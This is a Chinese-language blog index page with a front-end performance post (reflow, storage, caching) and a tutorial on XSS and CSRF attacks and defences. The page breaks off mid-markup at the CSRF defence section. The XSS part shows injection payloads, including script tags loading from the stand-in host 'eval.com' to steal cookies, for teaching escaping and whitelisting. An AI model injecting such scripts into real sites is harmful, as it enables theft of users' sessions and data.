<!DOCTYPE html><html class="theme-next gemini use-motion" lang="zh-Hans"><head><meta name="generator" content="Hexo 3.9.0"><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1"><meta name="theme-color" content="#222"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="google-site-verification" content="vz1PrlmOl-C4FBrH_at-JOEneuzGOz7AfXa3QVThvy8"><meta name="baidu-site-verification" content="code-4IMpMXQpb6"><link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css"><link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css"><link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css"><link rel="icon" type="image/png" sizes="32x32" href="/img/favicon.ico?v=5.1.4"><link rel="icon" type="image/png" sizes="16x16" href="/img/favicon.ico?v=5.1.4"><meta name="keywords" content="gdccwxx"><meta name="description" content="个人博客分享，热爱生活，热爱探索"><meta property="og:type" content="website"><meta property="og:title" content="gdccwxx"><meta property="og:url" content="https://blog.gdccwxx.com/page/2/index.html"><meta property="og:site_name" content="gdccwxx"><meta property="og:description" content="个人博客分享，热爱生活，热爱探索"><meta property="og:locale" content="zh-Hans"><meta name="twitter:card" content="summary"><meta name="twitter:title" content="gdccwxx"><meta name="twitter:description" content="个人博客分享，热爱生活，热爱探索"><script type="text/javascript" id="hexo.configurations">var NexT=window.NexT||{},CONFIG={root:"/",scheme:"Gemini",version:"5.1.4",sidebar:{position:"left",display:"post",offset:12,b2t:!1,scrollpercent:!1,onmobile:!1},fancybox:!0,tabs:!0,motion:{enable:!0,async:!1,transition:{post_header:"slideDownIn",post_body:"slideDownIn"}},duoshuo:{userId:"undefined",author:"博主"},algolia:{applicationID:"",apiKey:"",indexName:"",hits:{per_page:10},labels:{input_placeholder:"Search for Posts",hits_empty:"We didn't find any results for the search: ${query}",hits_stats:"${hits} results found in ${time} ms"}}}</script><link rel="canonical" href="https://blog.gdccwxx.com/page/2/"><title>gdccwxx - :)</title><script>!function(e,a,t,n,g,c){e.GoogleAnalyticsObject=n,e.ga=e.ga||function(){(e.ga.q=e.ga.q||[]).push(arguments)},e.ga.l=+new Date,g=a.createElement(t),c=a.getElementsByTagName(t)[0],g.async=1,g.src="https://www.google-analytics.com/analytics.js",c.parentNode.insertBefore(g,c)}(window,document,"script","ga"),ga("create","UA-118405225-1","auto"),ga("send","pageview")</script></head><body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans"><div class="container sidebar-position-left page-home"><div class="headband"></div><header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="header-inner"><div class="site-brand-wrapper"><div class="site-meta"><div class="custom-logo-site-title"><a href="/" class="brand" rel="start"><span class="logo-line-before"><i></i></span> <span class="site-title">gdccwxx</span> <span class="logo-line-after"><i></i></span></a></div><h1 class="site-subtitle" itemprop="description">:)</h1></div><div class="site-nav-toggle"><button><span class="btn-bar"></span> <span class="btn-bar"></span> <span class="btn-bar"></span></button></div></div><nav class="site-nav"><ul id="menu" class="menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i><br>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i><br>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i><br>标签</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i><br>归档</a></li><li class="menu-item menu-item-search"><a href="javascript:;" class="popup-trigger"><i class="menu-item-icon fa fa-search fa-fw"></i><br>搜索</a></li></ul><div class="site-search"><div class="popup search-popup local-search-popup"><div class="local-search-header clearfix"><span class="search-icon"><i class="fa fa-search"></i> </span><span class="popup-btn-close"><i class="fa fa-times-circle"></i></span><div class="local-search-input-wrapper"><input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input"></div></div><div id="local-search-result"></div></div></div></nav></div></header><main id="main" class="main"><div class="main-inner"><div class="content-wrap"><div id="content" class="content"><section id="posts" class="posts-expand"><article class="post post-type-normal" itemscope itemtype="http://schema.org/Article"><div class="post-block"><link itemprop="mainEntityOfPage" href="https://blog.gdccwxx.com/前端/font-end-optimize/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="name" content="gdccwxx"><meta itemprop="description" content><meta itemprop="image" content="/img/logo-gray.jpg"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="gdccwxx"></span><header class="post-header"><h2 class="post-title" itemprop="name headline"><a class="post-title-link" href="/前端/font-end-optimize/" itemprop="url">前端性能优化</a></h2><div class="post-meta"><span class="post-time"><span class="post-meta-item-icon"><i class="fa fa-calendar-o"></i> </span><span class="post-meta-item-text">发表于</span> <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-05-11T23:46:04+08:00">2019-05-11</time></span></div></header><div class="post-body" itemprop="articleBody"><h3 id="资源合并与压缩-http请求的过程及潜在的性能优化"><a href="#资源合并与压缩-http请求的过程及潜在的性能优化" class="headerlink" title="资源合并与压缩-http请求的过程及潜在的性能优化"></a>资源合并与压缩-http请求的过程及潜在的性能优化</h3><p>浏览器的一个请求从发送到返回都经历了什么</p><p><img src="/img/loading.gif" data-original="/前端/font-end-optimize/page-process.png" alt="http"></p><p>思考</p><ul><li>dns是否可以通过缓存减少dns查询时间？</li><li>网络请求的过程走最近的网络环境？</li><li>相同的静态资源是否可以缓存？</li><li>能否减少请求http请求大小？</li><li>减少http请求</li><li>服务端渲染<h2 id="重绘和回流"><a href="#重绘和回流" class="headerlink" title="重绘和回流"></a>重绘和回流</h2><h3 id="css会让JavaScript变慢吗"><a href="#css会让JavaScript变慢吗" class="headerlink" title="css会让JavaScript变慢吗"></a>css会让JavaScript变慢吗</h3>一个线程执行JavaScript<br>一个线程执行渲染<br>频繁触发重绘和回流，导致UI渲染频繁，最重导致js变慢<h3 id="啥是重绘和回流"><a href="#啥是重绘和回流" class="headerlink" title="啥是重绘和回流"></a>啥是重绘和回流</h3><h4 id="回流"><a href="#回流" class="headerlink" title="回流"></a>回流</h4></li><li>当render tree中的一部分或全部因为元素规模尺寸，布局，隐藏等改变需要重新构建，称作为回流（reflow）</li><li>当页面布局和几何属性变化时，就需要回流<h4 id="重绘"><a href="#重绘" class="headerlink" title="重绘"></a>重绘</h4>当render tree中的一些元素需要更新属性，而这些属性只是影响元素外观，风格，而不会影响布局的，比如background-color，则称之为重绘</li></ul><p>回流一定会重绘，重绘不一定会回流</p><h3 id="触发页面重布局的属性"><a href="#触发页面重布局的属性" class="headerlink" title="触发页面重布局的属性"></a>触发页面重布局的属性</h3><ul><li>盒子模型相关属性会触发重布局</li><li>定位属性及浮动会触发页面重布局</li><li>改变节点内部文字结构会触发重布局<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">width			top			text-align</span><br><span class="line">height			bottom		overflow-y</span><br><span class="line">padding			left		font-weight</span><br><span class="line">margin			right		overflow</span><br><span class="line">display			position	font-family</span><br><span class="line">border-width	float		line-height</span><br><span class="line">border			clear		vertical-align</span><br><span class="line">min-height					white-space</span><br><span class="line">							font-size</span><br></pre></td></tr></table></figure></li></ul><h3 id="触发页面重绘的属性"><a href="#触发页面重绘的属性" class="headerlink" title="触发页面重绘的属性"></a>触发页面重绘的属性</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">color				border-style</span><br><span class="line">border-radius		visibility</span><br><span class="line">text-decoration		background</span><br><span class="line">background-image	background-position</span><br><span class="line">background-repeat	background-size</span><br><span class="line">outline-color		outline</span><br><span class="line">outline-style		outline-width</span><br><span class="line">box-shadow</span><br></pre></td></tr></table></figure><h3 id="新建DOM过程"><a href="#新建DOM过程" class="headerlink" title="新建DOM过程"></a>新建DOM过程</h3><p>1、 获取DOM后分割为多个图层<br>2、 对每个图层的阶段计算样式结果(recalulate style — 样式重计算)<br>3、 为每个节点生成图形和位置(Layout— 回流和重布局)<br>4、 将每个节点绘制填充到图层位置中(Paint setup 和Paint — 重绘)<br>5、 图层作为纹理上传至gpu<br>6、 符合多个图层到页面上生成最终屏幕图像(composite layers — 图层重组)</p><h3 id="减少重绘和回流"><a href="#减少重绘和回流" class="headerlink" title="减少重绘和回流"></a>减少重绘和回流</h3><p>避免重绘回流的css<br>将频繁重绘和回流的dom元素单独作为独立图层，那么这个dom元素只会影响这个独立图层</p><h3 id="如何将DOM创建一个新的图层"><a href="#如何将DOM创建一个新的图层" class="headerlink" title="如何将DOM创建一个新的图层"></a>如何将DOM创建一个新的图层</h3><p>1、3D或者透视变化CSS属性(perspective transform)<br>2、 使用加速视屏解码的 video 节点<br>3、拥有3D(webGL)上下文或加速的2D上下文的 canvas 节点<br>4、混合插件(如flash)<br>5、对自己的opacity做css动画或使用一个动画webkit变换的元素<br>6、使用加速CSS过滤器的元素(translate3D..)<br>7、元素有一个包含复合层的后代节点(一个元素拥有一个子元素，该元素在自己的层里)<br>8、元素有一个z-index较低且包含一个符合层的兄弟元素(该元渲染在符合层上面渲染)</p><h3 id="避免重绘回流"><a href="#避免重绘回流" class="headerlink" title="避免重绘回流"></a>避免重绘回流</h3><p>1、用translate替代top：top会触发回流而translate不会<br>2、用opacity替代visibility：visibility会触发重绘而opacity不会<br>3、不要一条条修改DOM修改样式，可以放在一个class内，替换class<br>4、离线修改，使用display-none修改元素再显示<br>5、不要把DOM节点属性值放在一个循环里的变量里（offsetHight， offsetWidth）<br>6、不使用table布局，可能很小的修改导致整个table重新布局<br>7、动画实现的速度的选择<br>8、对于动画新建图层 (git图加上will-change, transform)<br>9、使用GPU硬件加速(trasform: translateZ, trasform: transform3d(0,0,0))</p><h2 id="localStorage"><a href="#localStorage" class="headerlink" title="localStorage"></a>localStorage</h2><ul><li>HTML5设计出来专门用于浏览器存储的</li><li>大小为5M左右</li><li>尽在客户端使用，不和服务端通信</li><li>接口封装比较好</li><li>浏览器本地缓存方案</li></ul><h2 id="SessionStorage"><a href="#SessionStorage" class="headerlink" title="SessionStorage"></a>SessionStorage</h2><ul><li>会话级别的浏览器存储</li><li>大小为5M左右</li><li>仅在客户端使用，不和服务器端通信</li><li>接口封装较好</li><li>对于表单信息的维护</li></ul><h2 id="indexDB"><a href="#indexDB" class="headerlink" title="indexDB"></a>indexDB</h2><ul><li>IndexedDB 是一种低级API，用于客户端存储大量结构化数据(包括, 文件/ blobs)。该API使用索引来实现对该数据的高性能搜索。虽然 Web Storage 对于存储较少量的数据很有用，但对于存储更大量的结构化数据来说，这种方法不太有用。IndexedDB提供了一个解决方案。</li><li>为应用创建离线版本</li></ul><h2 id="PWA"><a href="#PWA" class="headerlink" title="PWA"></a>PWA</h2><p>Progressive Web App, 简称 PWA，是提升 Web App 的体验的一种新方法，能给用户原生应用的体验。</p><p>PWA 能做到原生应用的体验不是靠特指某一项技术，而是经过应用一些新技术进行改进，在安全、性能和体验三个方面都有很大提升，PWA 本质上是 Web App，借助一些新技术也具备了 Native App 的一些特性，兼具 Web App 和 Native App 的优点。</p><p>PWA 的主要特点包括下面三点：</p><p>可靠 - 即使在不稳定的网络环境下，也能瞬间加载并展现<br>体验 - 快速响应，并且有平滑的动画响应用户的操作<br>粘性 - 像设备上的原生应用，具有沉浸式的用户体验，用户可以添加到桌面<br>PWA 本身强调渐进式，并不要求一次性达到安全、性能和体验上的所有要求，开发者可以通过 PWA Checklist 查看现有的特征。</p><h2 id="Service-Worker"><a href="#Service-Worker" class="headerlink" title="Service Worker"></a>Service Worker</h2><p>1、使用拦截和处理网络请求能力，实现离线应用<br>2、使用Service Worker在后台运行同时和页面通信的能力，趋势线大规模后台数据处理</p><h2 id="缓存"><a href="#缓存" class="headerlink" title="缓存"></a>缓存</h2><h3 id="httpheader"><a href="#httpheader" class="headerlink" title="httpheader"></a>httpheader</h3><h4 id="Cache-Control"><a href="#Cache-Control" class="headerlink" title="Cache-Control"></a>Cache-Control</h4><ul><li>max-age=”seconds”<br>设置缓存存储的最大周期，超过这个时间缓存被认为过期(单位秒)。与Expires相反，时间是相对于请求的时间。</li><li>s-maxage=”seconds”<br>覆盖max-age 或者 Expires 头，但是仅适用于共享缓存(比如各个代理)，并且私有缓存中它被忽略。</li><li>public<br>表明响应可以被任何对象（包括：发送请求的客户端，代理服务器，等等）缓存。</li><li>private<br>表明响应只能被单个用户缓存，不能作为共享缓存（即代理服务器不能缓存它）,可以缓存响应内容。</li><li>no-cache<br>在发布缓存副本之前，强制高速缓存将请求提交给原始服务器进行验证。</li><li>no-store<br>缓存不应存储有关客户端请求或服务器响应的任何内容。<h4 id="Expires"><a href="#Expires" class="headerlink" title="Expires"></a>Expires</h4></li><li>缓存过期时间，用来指定资源到期时间，是服务器端的具体的时间点</li><li>告诉浏览器在过期时间前浏览器可以直接从浏览器缓存去数据，无需再次请求<h4 id="Last-Modified-If-Modified-Since"><a href="#Last-Modified-If-Modified-Since" class="headerlink" title="Last-Modified/If-Modified-Since"></a>Last-Modified/If-Modified-Since</h4><h5 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h5>The Last-Modified 是一个响应首部，其中包含源头服务器认定的资源做出修改的日期及时间。 它通常被用作一个验证器来判断接收到的或者存储的资源是否彼此一致<br>1、请求浏览器，给到缓存文件，response带有last-modified 给到浏览器存储为last-modified-since<br>2、浏览器再次请求文件，带有last-modiied-since, 服务器对比last-modified，若过期则给到新的文件，若不过期，则继续使用本地文件<h5 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h5>1、某些服务器不能获取精确的修改时间<br>2、文件修改时间改了，但文件内容却没有改变<h4 id="Etag-If-None-Match"><a href="#Etag-If-None-Match" class="headerlink" title="Etag/If-None-Match"></a>Etag/If-None-Match</h4></li><li>文件内容的hash值</li><li>etag——response header</li><li>if-none-match —— request header</li><li>需要和cache-control一起使用<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"> ---------------------    </span><br><span class="line">					   当浏览器本地没有缓存或者下一层失效时，或者用户点击刷新</span><br><span class="line">\       200状态        /   浏览器直接去服务器下载最新数据</span><br><span class="line"></span><br><span class="line">  -------------------     </span><br><span class="line">					   这一层由 last-modified / Etag 控制,当下一层失效时，</span><br><span class="line">  \     304状态       /    或用户点击刷新，浏览器就会发送请求给服务器，如果文件无变</span><br><span class="line">					   化则返回304</span><br><span class="line">    ----------------      </span><br><span class="line">				       这层由expires/cache-control控制，expires(http 1.0     </span><br><span class="line">    \ 200(from disk) /    有效)是绝对时间，cache-control(http1.1版有效)相对</span><br><span class="line">					   时间，两者都存在，cache-control覆盖expires，没有失效</span><br><span class="line">      --------------      则直接访问自己缓存</span><br></pre></td></tr></table></figure></li></ul><p><img src="/img/loading.gif" data-original="/前端/font-end-optimize/font-end-cache.png" alt="Alt text"></p><h2 id="服务端性能优化"><a href="#服务端性能优化" class="headerlink" title="服务端性能优化"></a>服务端性能优化</h2><h3 id="多层次优化方案"><a href="#多层次优化方案" class="headerlink" title="多层次优化方案"></a>多层次优化方案</h3><ul><li>构建层模版编译</li><li>数据无关prerender方式</li><li>服务端渲染</li></ul></div><footer class="post-footer"><div class="post-eof"></div></footer></div></article><article class="post post-type-normal" itemscope itemtype="http://schema.org/Article"><div class="post-block"><link itemprop="mainEntityOfPage" href="https://blog.gdccwxx.com/http/what-is-xss-csrf/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="name" content="gdccwxx"><meta itemprop="description" content><meta itemprop="image" content="/img/logo-gray.jpg"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="gdccwxx"></span><header class="post-header"><h2 class="post-title" itemprop="name headline"><a class="post-title-link" href="/http/what-is-xss-csrf/" itemprop="url">啥是XSS和CSRF?</a></h2><div class="post-meta"><span class="post-time"><span class="post-meta-item-icon"><i class="fa fa-calendar-o"></i> </span><span class="post-meta-item-text">发表于</span> <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-04-18T18:18:49+08:00">2019-04-18</time></span></div></header><div class="post-body" itemprop="articleBody"><p>本文通过介绍、原理、防御来讲解XSS以及CSRF。主要介绍及讲解攻击原理，及防御原理。</p><h1 id="啥是XSS？"><a href="#啥是XSS？" class="headerlink" title="啥是XSS？"></a>啥是XSS？</h1><h2 id="XSS-Cross-site-scripting-介绍"><a href="#XSS-Cross-site-scripting-介绍" class="headerlink" title="XSS(Cross-site scripting)介绍"></a>XSS(Cross-site scripting)介绍</h2><p>以下是<strong>Wikipedia</strong>及<strong>MDN</strong>对XSS的介绍</p><blockquote><p>Wikipedia:</p><p><strong>跨网站指令码</strong>（英语：Cross-site scripting，通常简称为：XSS）是一种网站应用程式的安全漏洞攻击，是代码注入的一种。它允许恶意使用者将程式码注入到网页上，其他使用者在观看网页时就会受到影响。这类攻击通常包含了HTML以及使用者端脚本语言。</p><p><strong>XSS</strong>攻击通常指的是通过利用网页开发时留下的漏洞，通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。这些恶意网页程序通常是JavaScript，但实际上也可以包括Java，VBScript，ActiveX，Flash或者甚至是普通的HTML。攻击成功后，攻击者可能得到更高的权限（如执行一些操作）、私密网页内容、会话和cookie等各种内容。</p><p>MDN:</p><p>跨站脚本攻击Cross-site scripting (XSS)是一种安全漏洞，攻击者可以利用这种漏洞在网站上注入恶意的客户端代码。当被攻击者登陆网站时就会自动运行这些恶意代码，从而，攻击者可以突破网站的访问权限，冒充受害者</p></blockquote><p><strong>划重点： 网站漏洞、HTML、脚本、恶意注入、获取权限</strong></p><p><strong>总结：跨站脚本攻击用户加载恶意脚本，用户信息及权限等被恶意获取</strong></p><h2 id="XSS原理"><a href="#XSS原理" class="headerlink" title="XSS原理"></a>XSS原理</h2><p>被攻击的通常分为两种类型：<strong>存储型XSS、反射型XSS</strong></p><h3 id="存储型XSS原理"><a href="#存储型XSS原理" class="headerlink" title="存储型XSS原理"></a>存储型XSS原理</h3><blockquote><p>注入型脚本永久存储在目标服务器上。当浏览器请求数据时，脚本从服务器上传回并执行。</p></blockquote><p>下面看一个例子：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">// html 评论</span><br><span class="line">&lt;input name=&quot;comment&quot; id=&quot;comment&quot; value=&quot;&lt;script src=&apos;http://eval.com&apos;&gt;&lt;/script&gt;&quot;/&gt;</span><br><span class="line"></span><br><span class="line">// db</span><br><span class="line">insert into table value(&quot;&lt;script src=&apos;http://eval.com&apos;&gt;&lt;/script&gt;&quot;)</span><br><span class="line"></span><br><span class="line">// 步骤</span><br><span class="line">1、恶意用户将评论带一个script标签，script带有恶意攻击，例如获取页面cookies</span><br><span class="line">2、评论被添加进数据库</span><br><span class="line">3、用户都可以看见评论，并加载一个script</span><br><span class="line">4、恶意script盗取用户信息</span><br></pre></td></tr></table></figure><p><strong>总结：存储型XSS将恶意代码存储进数据库，用户加载恶意脚本时，恶意脚本将会从服务器上传回并执行</strong></p><h3 id="反射型XSS原理"><a href="#反射型XSS原理" class="headerlink" title="反射型XSS原理"></a>反射型XSS原理</h3><blockquote><p>当用户点击一个恶意链接，或者提交一个表单，或者进入一个恶意网站时，注入脚本进入被攻击者的网站。Web服务器将注入脚本，比如一个错误信息，搜索结果等 返回到用户的浏览器上。浏览器会执行这段脚本，因为，它认为这个响应来自可信任的服务器。</p></blockquote><p>下面看一个例子：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">// url</span><br><span class="line">http://example.com?search=value&apos;&lt;script src=&quot;http://eval.com&quot;&gt;&lt;/script&gt;&apos;</span><br><span class="line"></span><br><span class="line">// html</span><br><span class="line">&lt;input value=window.location.search&gt;</span><br><span class="line"></span><br><span class="line">// 步骤</span><br><span class="line">1、网页内嵌值由参数直接传入</span><br><span class="line">2、恶意攻击者将参数包含script标签，加载恶意脚本</span><br><span class="line">3、恶意脚本在网页中生效，盗取用户信息</span><br></pre></td></tr></table></figure><p><strong>总结：反射型XSS是通过链接参数或表单，通过点击链接、注入恶意脚本，网页加载后，恶意脚本将会执行</strong></p><h2 id="XSS防御"><a href="#XSS防御" class="headerlink" title="XSS防御"></a>XSS防御</h2><h3 id="XSS注入点"><a href="#XSS注入点" class="headerlink" title="XSS注入点"></a>XSS注入点</h3><p>在防御之前应该了解XSS有哪些注入点，其中包括HTML节点、HTML属性、JavaScript代码以及富文本</p><h4 id="HTML节点"><a href="#HTML节点" class="headerlink" title="HTML节点"></a>HTML节点</h4><p>html节点包含用户输入内容，节点内容包含脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// HTML</span><br><span class="line">&lt;div&gt;$&#123;content&#125;&lt;/div&gt;</span><br><span class="line">// 用户输入，将content内容替换为&lt;script&gt;alert(1)&lt;/script&gt;</span><br><span class="line">&lt;div&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;/div&gt;</span><br></pre></td></tr></table></figure><h4 id="HTML属性"><a href="#HTML属性" class="headerlink" title="HTML属性"></a>HTML属性</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// HTML</span><br><span class="line">&lt;img src=&quot;$&#123;src&#125;&quot;&gt;</span><br><span class="line">// 用户输入，将src替换为 2&quot; onerror=&quot;alert(2)</span><br><span class="line">&lt;img src=&quot;2&quot; onerror=&quot;alert(2)&quot;&gt;</span><br></pre></td></tr></table></figure><h4 id="JavaScript代码"><a href="#JavaScript代码" class="headerlink" title="JavaScript代码"></a>JavaScript代码</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// JS</span><br><span class="line">&lt;script&gt;</span><br><span class="line">	var data = &quot;$&#123;data&#125;&quot;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">// 用户输入，将data替换为 hello&quot;;alert(3); var a = &quot;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">	var data = &quot;hello&quot;; alert(3);var a = &quot;&quot;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h4 id="富文本"><a href="#富文本" class="headerlink" title="富文本"></a>富文本</h4><p>由于富文本需要保留html的原因，因此本身会有xss风险</p><h3 id="XSS分析及防御"><a href="#XSS分析及防御" class="headerlink" title="XSS分析及防御"></a>XSS分析及防御</h3><p>了解攻击原理后，防御自然而然的也水到渠成了</p><h4 id="浏览器自带防御"><a href="#浏览器自带防御" class="headerlink" title="浏览器自带防御"></a>浏览器自带防御</h4><p>浏览器自带一些防御能力，只能防御 XSS 反射类型攻击，且只能防御HTML属性</p><p>防御原理是将可能会执行脚本的标签或属性进行转义和过滤。</p><h4 id="HTML节点内容及属性防御"><a href="#HTML节点内容及属性防御" class="headerlink" title="HTML节点内容及属性防御"></a>HTML节点内容及属性防御</h4><p>将&lt;和&gt;转译成&amp;lt &amp;gt，将单引号，双引号，&amp;及空格等转译</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// HTML</span><br><span class="line">&lt;div&gt;$&#123;content&#125;&lt;/div&gt;</span><br><span class="line">// 用户输入&lt;script&gt;alert(1)&lt;/script&gt;后进行转译，将&lt;&gt;进行转译&amp;ltscript&amp;gtalert(1)&amp;lt/script&amp;gt</span><br><span class="line">&lt;div&gt;&amp;ltscript&amp;gtalert(1)&amp;lt/script&amp;gt&lt;/div&gt;</span><br></pre></td></tr></table></figure><h4 id="Javascript代码防御"><a href="#Javascript代码防御" class="headerlink" title="Javascript代码防御"></a>Javascript代码防御</h4><p>使用JSON.stringify</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// JS</span><br><span class="line">&lt;script&gt;</span><br><span class="line">	var data = &quot;$&#123;data&#125;&quot;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">// 用户输入，将data替换为 hello&quot;;alert(3); var a = &quot;,使用JSON.stringify(hello&quot;;alert(3); var a = &quot;)</span><br><span class="line">// 对输入内容会出现转译错误，结束操作</span><br></pre></td></tr></table></figure><h4 id="富文本防御"><a href="#富文本防御" class="headerlink" title="富文本防御"></a>富文本防御</h4><p>按照白名单保留部分标签和属性</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">var whiteList = &#123;</span><br><span class="line">    &quot;img&quot;:[&quot;src&quot;],</span><br><span class="line">    &quot;a&quot;:[&quot;href&quot;],</span><br><span class="line">    &quot;font&quot;:[&quot;color&quot;,&quot;size&quot;]</span><br><span class="line">&#125;;</span><br><span class="line">html.forEach(node =&gt; &#123;</span><br><span class="line">    // 过滤白名单</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>最佳方式使用第三方<a href="https://github.com/leizongmin/js-xss" target="_blank" rel="noopener">js-xss</a>白名单进行过滤</p><h3 id="XSS攻击防御总结："><a href="#XSS攻击防御总结：" class="headerlink" title="XSS攻击防御总结："></a>XSS攻击防御总结：</h3><ul><li>XSS是通过加载第三方脚本进行攻击</li><li>XSS攻击类型有存储型和反射型</li><li>XSS注入点包括HTML节点、HTML属性、JavaScript代码以及富文本</li><li>XSS防御通过浏览器自带防御、标签转译、JS代码JSON.stringify及白名单过滤进行防御</li></ul><h1 id="啥又是CSRF？"><a href="#啥又是CSRF？" class="headerlink" title="啥又是CSRF？"></a>啥又是CSRF？</h1><h2 id="CSRF-Cross-Site-Request-forgery-介绍"><a href="#CSRF-Cross-Site-Request-forgery-介绍" class="headerlink" title="CSRF(Cross Site Request forgery)介绍"></a>CSRF(Cross Site Request forgery)介绍</h2><p>以下是<strong>Wikipedia</strong>及<strong>MDN</strong>对CSRF的介绍</p><blockquote><p>Wikipedia:</p><p><strong>跨站请求伪造</strong>（英语：Cross-site request forgery），也被称为 <strong>one-click attack</strong> 或者 <strong>session riding</strong>，通常缩写为 <strong>CSRF</strong> 或者 <strong>XSRF</strong>， 是一种挟制用户在当前已登录的Web应用程序上执行非本意的操作的攻击方法</p><p>MDN:</p><p>跨站请求伪造（CSRF）是一种冒充受信任用户，向服务器发送非预期请求的攻击方式</p></blockquote><p><strong>划重点：跨站请求伪造、冒充受信任用户、发送非预期请求</strong></p><p><strong>总结：CSRF是通过冒充用户来达到攻击目的的方式</strong></p><h2 id="CSRF原理"><a href="#CSRF原理" class="headerlink" title="CSRF原理"></a>CSRF原理</h2><p>CSRF可以通过请求，携带用户登录态，伪造请求。在用户不知情的情况下，可利用用户身份完成业务请求</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">   www.a.com后端</span><br><span class="line">	  ||\       |\</span><br><span class="line">   1||2          \  3</span><br><span class="line">   \||             \</span><br><span class="line">www.a.com前端         www.b.com</span><br><span class="line"></span><br><span class="line">1、用户登陆A网站</span><br><span class="line">2、A网站确认身份</span><br><span class="line">3、B网站页面向A网站发起请求（带A网站身份）</span><br></pre></td></tr></table></figure><h2 id="CSRF分析及防御"><a href="#CSRF分析及防御" class="headerlink" title="CSRF分析及防御"></a>CSRF分析及防御</h2><h3 id="CSRF原理分析"><a href="#CSRF原理分析" class="headerlink" title="CSRF原理分析"></a>CSRF原理分析</h3><p>B网站向A网站发起攻击原理：</p><ul><li>B网站向A网站请求</li><li>携带A网站Cookie</li><li>不访问A网站前端</li><li>请求的referer为B网站</li></ul><h3 id="CSRF防御"><a 